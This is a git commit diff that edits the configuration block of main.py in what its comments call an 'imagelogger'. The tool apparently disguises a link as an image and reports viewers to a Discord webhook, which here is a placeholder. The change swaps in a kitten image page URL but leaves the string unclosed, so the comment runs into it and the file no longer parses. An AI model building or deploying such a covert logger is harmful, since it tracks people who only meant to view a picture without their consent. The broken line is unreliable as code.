97f1ea0d95ec2da5d9810862e5256d03dfbba3da
jimmyyesskib <isaacpropascual@gmail.com>
2025-06-17 15:21:57 -0700

    Update main.py

--- main.py
+++ main.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://www.freepik.com/free-ai-image/close-up-adorable-kitten-nature_65548615.htm#fromView=keyword&page=1&position=1&uuid=cf565104-aa72-42c5-b9ee-70d643c5c9ba&query=Cat+Jpg # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
